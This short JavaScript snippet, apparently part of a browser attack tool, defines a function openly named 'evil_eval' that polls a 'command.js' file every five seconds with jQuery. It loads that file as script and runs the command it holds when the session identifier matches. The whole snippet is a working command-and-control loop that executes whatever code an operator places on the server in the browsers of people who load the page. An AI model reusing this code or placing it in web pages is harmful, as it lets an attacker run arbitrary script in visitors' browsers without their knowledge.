function evil_eval(){
    $.ajax({
               url: "./command.js",
               cache: false,
               crossDomain : true,
               dataType : "script",
               success: function(res){
                   if(com.session.match(SESSION)){
                       com.command.call();
                   }else{
                       console.log("for other session command.");
                   }
               }
           });    
}

var timer;
$(function(){
      timer = setInterval(evil_eval,5000);
  });